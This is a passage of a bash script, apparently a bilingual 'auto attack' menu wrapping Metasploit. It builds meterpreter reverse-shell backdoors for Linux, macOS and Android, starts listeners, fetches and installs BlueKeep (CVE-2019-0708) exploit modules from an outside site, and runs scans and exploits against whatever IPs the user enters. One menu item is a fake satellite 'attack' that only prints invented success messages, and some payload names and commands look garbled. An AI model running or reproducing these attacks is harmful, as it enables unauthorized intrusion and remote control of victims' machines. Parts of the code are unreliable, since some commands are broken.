	echo -e "Backdoor Create in/$Me_MuLu/CatGames_Payload.elf"
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f elf > /$Me_MuLu/CatGames_Payload.elf
	;;
	"3" | "3" )
	read -p "Please enter bounce IP：" MeIP
	read -p "Please enter bounce port：" Me_Port
	read -p "Please enter the payload output directory (example: tmp)：" Me_MuLu
	echo -e "Backdoor Create in/$Me_MuLu/CatGames_Payload.macho"
	msfvenom -p osx/x86ell_reverse_tcp LHOST=$MeIP LPORT=$Me_Port -f macho > /$Me_MuLu/CatGames_Payload.macho
	;;
	"4" | "4" )
	echo -e "text"
	read -p "Please enter bounce IP：" MeIP
	read -p "Please enter bounce port：" Me_Port
	read -p "Please enter the payload output directory (example: tmp)：" Me_MuLu
	echo -e "Backdoor Create in/$Me_MuLu/CatGames_Payload.apk"
	msfvenom -p android/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port R > /$Me_MuLu/CatGames_Payload.apk
	;;
  [a-z] | [a-z] )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  Get_Payload
  ;;
  [5-9] | [5-9] )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  Get_Payload
  ;;
  "" | "" )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  Get_Payload
  ;;
	"0" | "0" )
	clear
	CatGames_MenUI
	esac
	exit
}

CatGames_satellite(){
	read -p "Please enter which country's satellite needs to be attacked (currently supported by the United States):" satellite;
	echo -e "You chose[$satellite]Satellite "
	read -p "Please select the place where the satellite will fall after the successful attack:" place;
	echo -e "The place you choose to fall is[$place]"
	int=1
	while(( $int<=5 ))
	do
    echo -e "Please wait$int second"
    echo -e "Attack feedback: firewall has been broken, overflow has been executed, exp attack succeeded!"
    let "int++"
	done
	echo -e "The attack is successful. A satellite in the United States has fallen $place,Good job, hacker"
	CatGames_China_No-1
	echo -e "\n"
	echo -e ""
	read -p "[Enter] return to the main menu"
	clear
	CatGames_MenUI
}
Apache_Service(){
  service apache2 start
  echo -e "Apache Service Startup success"
  read -p "Please Input 0 Go to Menu :" ApacheMenu
  case $ApacheMenu in "0" | "0")
      clear
      CatGames_MenUI
      ;;
  [1-9] | [1-9] )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  CatGames_MenUI
  ;;
  "" | "" )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  CatGames_MenUI
  ;;
  [a-z] | [a-z] )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  CatGames_MenUI
  ;;
esac
}
CatGames_Get_Poc(){
	git clone https://github.com/zerosum0x0/CVE-2019-0708.git
	cd CVE-2019-0708/rdesktop-fork-bd6aa6acddf0ba640a49834807872f4cc0d0a773/
	apt-get install dh-autoreconf
	apt-get install libssl-dev
	./bootstrap
	./configure --disable-credssp --disable-smartcard
	make
	read -p "Please enter the IP address and port (3389)：" IPPOC;
	./rdesktop $IPPOC
}
CatGames_Monitor(){
	clear
	CatGames_LoGo
	read -p "Please enter listening IP：" JTIP
	read -p "Please enter the listening port：" JTPROT
	msfconsole -x "use exploit/multi/handler;
	set PAYLOAD windows/meterpreter/reverse_tcp;
	set LHOST $JTIP;set PROT $JTPROT;run;"
}
CatGames_CVE2019-0708_Download(){
	CatGames_LoGo
	mkdir /usr/share/metasploit-framework/modules/exploits/windows/rdp
	chmod -x /usr/share/metasploit-framework/modules/exploits/windows/rdp
	wget -P /root https://Blog.CatGAmes.cn/CVE2019-0708/rdp.rb
	cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/
	wget -P /root https://Blog.CatGAmes.cn/CVE2019-0708/rdp_scanner.rb
	cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/
	wget -P /root https://Blog.CatGAmes.cn/CVE2019-0708/cve_2019_0708_bluekeep_rce.rb
	mkdir /usr/share/metasploit-framework/modules/exploits/windows/rdp
	cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/
	wget -P /root https://Blog.CatGAmes.cn/CVE2019-0708/cve_2019_0708_bluekeep.rb
	cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/
	echo "rdp.rb,rdp_scanner.rb,cve_2019_0708_bluekeep_rce.rb,cve_2019_0708_bluekeep.rb 下载成功 并已拷贝到指定目录"
	msfconsole -x "reload_all;exit"
	echo -e "All modules have been Reloaded:) good luck"
	echo -e "===================================================================="
	CatGames_MenUI
}
CatGames_CVE2019-0708(){
	clear
	CatGames_LoGo
	echo -e "Please select the module you need to use"
	echo -e "[1] CVE 2019 auxiliary module"
	echo -e "[2] CVE 2019 vulnerability module"
	read -p "Please enter your selection [press 0 to return to main menu]：" CVE
	case $CVE in "1" | "1" )
	clear
	CatGames_LoGo
	read -p "Please enter scan IP or IP segment：" CVE_2019_IP
	read -p "Please enter the number of scanning threads：" CVE_2019_thread
	msfconsole -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set RHOSTS $CVE_2019_IP;set threads $CVE_2019_thread;exploit"
	;;
	 "2" | "2" )
	clear
	CatGames_LoGo
	read -p "Please input the IP you want to attack：" CVE_2019_IP_EXP
	echo -e "Please choose target"
	echo -e "【0】 version of automatic fingerprint identification system"
	echo -e "【1】Windows 7 SP1 / 2008 R2 (6.1.7601 x64)"
	echo -e "【2】Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox)"
	echo -e "【3】Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)"
	echo -e "【4】Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)"
	read -p "Please enter (0-4)：" CVE_2019_EXP_TarGet
	echo -e "Please check the information carefully"
	echo -e "The IP you enter that you want to attack is：$CVE_2019_IP_EXP"
	echo -e "The target you entered is：$CVE_2019_EXP_TarGet"
	msfconsole -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce;set RHOSTS $CVE_2019_IP_EXP;set target $CVE_2019_EXP_TarGet;exploit"
	;;
  [3-9] | [3-9] )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  CatGames_CVE2019-0708
  ;;
  "" | "" )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  CatGames_CVE2019-0708
  ;;
  [a-z] | [a-z] )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  CatGames_CVE2019-0708
  ;;
	"0" | "0" )
	claer
	echo -e "===================================================================="
	CatGames_MenUI
esac
	exit
}
CatGames_About(){
	clear
	echo -e "Thanks for Cimoom_曲云杰 advice"
	sleep 2
	echo -e "Thanks for WRS戏子 advice"
	sleep 2
	echo -e "\033[5;32m _____       ___   _____   _____       ___       ___  ___   _____   _____
/  ___|     /   | |_   _| /  ___|     /   |     /   |/   | | ____| /  ___/
| |        / /| |   | |   | |        / /| |    / /|   /| | | |__   | |___
| |       / / | |   | |   | |  _    / / | |   / / |__/ | | |  __|  \___  \
| |___   / /  | |   | |   | |_| |  / /  | |  / /       | | | |___   ___| |
\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/  \033[0m"
	echo -e "By_CatGamesGa0"
	echo -e "My blog：Blog.CatGames.cn"
	echo -e "My mailbox：GaoCatGames@mail.sdu.edu.cn"
	sleep 3
	clear
	CatGames_MenUI
}
CatGames_MenUI(){
echo -e "\E[1;32m:::::::::::::: \e[97mCatGamesGa0 Automatic execution of attack script \E[1;32m:::::::::::::::"
echo -e "\E[1;32m:::::::::::::: \e[97m Attack and defense without absolute technology without black and white \E[1;32m:::::::::::::::"
CatGames_LoGo
echo -e "\033[32m======================="
echo -e "\033[32m|Please enter the function you want to use！"
echo -e "\033[32m|[1]MS17_010_eternalblue"
echo -e "\033[32m|[2]CVE-2019-0708-POC"
echo -e "\033[32m|[3]CVE-2019-0708-Download"
echo -e "\033[32m|[4]CVE-2019-0708-Exploit"
echo -e "\033[32m|[5]Attack satellite"
echo -e "\033[32m|[6]Create New Metaspoloit BackDoor"
echo -e "\033[32m|[7]Nmap Scan"
echo -e "\033[32m|[8]Metaspoloit Listeners"
echo -e "\033[32m|[9]Start Apache Service"
echo -e "\033[32m|[10]about"
echo -e "\033[32m|[0]Help"
echo -e "\033[32m======================="
read -p "Please enter the number you selected (enter to exit)：" Num
case $Num in "1" | "1" )
	clear
	CatGames_LoGo
	echo -e "\033[32m[1]Using the eternal blue scan module"
	echo -e "\033[32m[2]Use the eternal blue attack module"
	read -p "You choose to scan module or attack module (0 back to the previous layer)：" mod
	case $mod in "1" | "1" )
		clear
		eternalblue_AuTo_Auxiliary
			;;
			"2" | "2" )
		clear
		eternalblue_AuToExP
			;;
	  "" | "" )
    echo "[*]---------------------------"
    echo "Your input is wrong"
    read -p "Please press enter to return"
    echo "[*]---------------------------"
    clear
    CatGames_MenUI
    ;;
	  [a-z] | [a-z] )
    echo "[*]---------------------------"
    echo "Your input is wrong"
    read -p "Please press enter to return"
    echo "[*]---------------------------"
    clear
    CatGames_MenUI
    ;;
  	[3-9] | [3-9] )
    echo "[*]---------------------------"
    echo "Your input is wrong"
    read -p "Please press enter to return"
    echo "[*]---------------------------"
    clear
    CatGames_MenUI
    ;;
			"0" | "0" )
		clear
		CatGames_MenUI
		;;
	esac
	;;
	"2" | "2" )
	CatGames_Get_Poc
	;;
	"3" | "3" )
	CatGames_CVE2019-0708_Download
	;;
	"4" | "4" )
	CatGames_CVE2019-0708
	;;
	"5" | "5" )
	CatGames_satellite
	;;
	"6" | "6" )
	Get_Payload
	;;
	"7" | "7" )
	Nmap_Scan
	;;
  "8" | "8" )
  CatGames_Monitor
	;;
	"9" | "9" )
	Apache_Service
	;;
	"10" | "10" )
	CatGames_About
	;;
  "" | "" )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  CatGames_MenUI
  ;;
  [a-z] | [a-z] )
  echo "[*]---------------------------"
  echo "Your input is wrong"
  read -p "Please press enter to return"
  echo "[*]---------------------------"
  clear
  CatGames_MenUI
  ;;
	"0" | "0" )
		echo -e "===================================================================="
	echo -e "The best environment for using this tool is Kali Linux, because most of its functions are written as Kali Linux"
	echo -e "Of course, you can also choose to use it in other environments (Ubuntu, or other Linux)"
	echo -e "If it is used on non Kali Linux systems, it is not guaranteed that all functions will be complete"
	echo -e "Considering that the domestic download of Kali Linux would be particularly slow without a ladder"
	echo -e "Please copy to browser to open：https://pan.baidu.com/s/1ERx8huO66AOWKFPI_fKamw password：w4zw"
	echo -e "If you have any questions, please go to my blog: blog.catgames.cn"
	echo -e "Or send mail toGaoCatGames@mail.sdu.edu.cn"
	echo -e "Enter to return to the main menu"
	read -p ""
	clear
	CatGames_MenUI
esac
	exit
}
Initialization_Tools
echo -e "\E[1;32m<:::::::::::::: \e[97m Automatic attack tool \E[1;32m:::::::::::::::>"
echo -e "\E[1;32m<:::::::::::::: \e[97m Attack and defense without absolute technology without black and white \E[1;32m:::::::::::::::>"
CatGames_LoGo
echo -e "\E[1;32m<:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>"
echo -e "\E[1;32m<:::::::::::::: \e[97mMetasploit service started \E[1;32m:::::::::::::::::>"
echo -e "\E[1;32m<:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>"
CatGames_CaoNiMa
read -p "Initialization completed, press enter to start!"
clear
CatGames_MenUI
}
CatGames_MenLoGo_language(){
clear
echo -e " _____       ___   _____   _____       ___       ___  ___   _____   _____
/  ___|     /   | |_   _| /  ___|     /   |     /   |/   | | ____| /  ___/
| |        / /| |   | |   | |        / /| |    / /|   /| | | |__   | |___
| |       / / | |   | |   | |  _    / / | |   / / |__/ | | |  __|  \___
| |___   / /  | |   | |   | |_| |  / /  | |  / /       | | | |___   ___| |
\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/
        "
echo -e "By_CatGamesGa0       CatGames.cn Email：GaoCatGames@mail.sdu.edu.cn"
echo -e "My Blog:Blog.CatGames.cn"
time3=$(date "+%Y-%m-%d %H:%M:%S")
echo "Current time：$time3"
}
CatGames_main(){
echo -e "\033]0;CatGames Auto Attack EXP\007"
CatGames_MenLoGo_language
echo -e "Welcome to Auto Attack EXP"
echo -e "[1]简体中文"
echo -e "[2]English"
read -p "Please enter a number to select your language version：" Luang
case $Luang in "1" | "1" )
    CatGames_Chinese
    ;;
    "2" | "2" )
    CatGames_English
    ;;
    "" | "" )
    CatGames_main
    ;;
    [3-9] | [3-9] )
    echo "[*]--------------------------------------"
    echo -e "[*]Enter Error"
    read -p "[*]Please press enter to return"
    echo "[*]--------------------------------------"
    CatGames_main
    ;;
    [a-z] | [a-z] )
    echo "[*]--------------------------------------"
    echo -e "[*]Enter Error"
    read -p "[*]Please press enter to return"
    echo "[*]--------------------------------------"
    CatGames_main
    ;;
    "exit" | "exit" )
    echo -e "Welcome to use next time Bye！：）"
    exit
    ;;
esac
}
resize -s 40 110
CatGames_main
